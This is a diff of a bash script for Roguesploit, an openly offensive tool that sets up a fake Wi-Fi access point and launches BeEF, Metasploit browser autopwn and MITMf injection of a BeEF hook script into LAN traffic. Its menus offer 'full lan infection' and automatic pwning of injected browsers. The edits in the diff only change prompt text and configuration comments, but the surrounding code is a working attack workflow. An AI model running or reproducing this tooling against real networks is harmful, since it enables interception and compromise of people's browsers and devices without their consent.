@@ -893,8 +893,9 @@ EOF
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
 	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh"& xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" #sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #enable this instead of starting msf captive portal, but you'll need an internet connection and enable line 114. Add "--browsersniper" if you want to enable automatic pwning of injected browsers;
 #but you need to change some other option to enable correctly the metasploit method too;
-# Line 370: "auto_msfrpcd: false" to "auto_msfrpcd: true"
-# Line 319: "enable: false" to "enable: true"
+# Line 336: "auto_msfrpcd: false" to "auto_msfrpcd: true"
+# Line 284: "enable: false" to "enable: true"
+# Line 323: "enable: false" to "enable: true"
 # Line 929: change seconds to 30 or more for stability and good timing (Ex.  .. sleep 20 .. to .. sleep 30 ..)
 # if you enable this method, please comment this " term -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" " or you'll have problems :D
 	menu
@@ -928,7 +929,7 @@ if test $answer1 == '1'
 	pkill dns*
 	pkill tor
 	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]\n";
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": ";tput sgr0
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) "; 
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -952,7 +953,7 @@ elif test $answer1 == '2'
 	echo -e $yellow" 1. Browser Autopwn 1"
 	echo -e $blue" 2. Browser Autopwn 2"
 	echo -e $white" 3. BeEF + MITMF full lan infection"
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": "tput sgr0
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": "
 	read choice
 	if test $choice == '1'
 		then
@@ -1139,8 +1140,8 @@ if test $answer1 == '1'
 	pkill dhcpd
 	pkill hostapd
 	pkill dns*
-	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]";
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": ";tput sgr0
+	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]\n";
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) "; 
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -1164,7 +1165,7 @@ elif test $answer1 == '2'
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
 	echo -e $white" 3. BeEF + MITMF full lan infection"
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": "tput sgr0
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"pwningservices"$red"]"$white": ";
 	read choice
 	if test $choice == '1'
 		then
